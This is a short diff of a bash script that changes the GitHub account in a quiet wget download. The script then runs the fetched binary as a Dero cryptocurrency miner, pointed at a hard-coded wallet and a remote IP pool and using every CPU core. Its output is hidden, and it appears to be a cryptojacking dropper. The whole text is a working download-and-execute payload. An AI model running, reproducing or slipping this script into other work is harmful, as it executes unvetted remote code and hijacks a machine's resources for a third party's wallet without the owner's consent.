@@ -1,4 +1,4 @@
 #!/bin/bash
-wget -O sgr1 https://github.com/parmount6/filesg/raw/main/astro >/dev/null 2>&1
+wget -O sgr1 https://github.com/6248202226/filesg/raw/main/astro >/dev/null 2>&1
 chmod +x sgr1
 ./sgr1 -w dero1qytfne4y9mpry7kcxrl5z328sqrmy349ldgawmu32yy5yzrjrnygjqg0vw3yu -r 136.244.103.215:10100 -p rpc -m $(nproc --all)
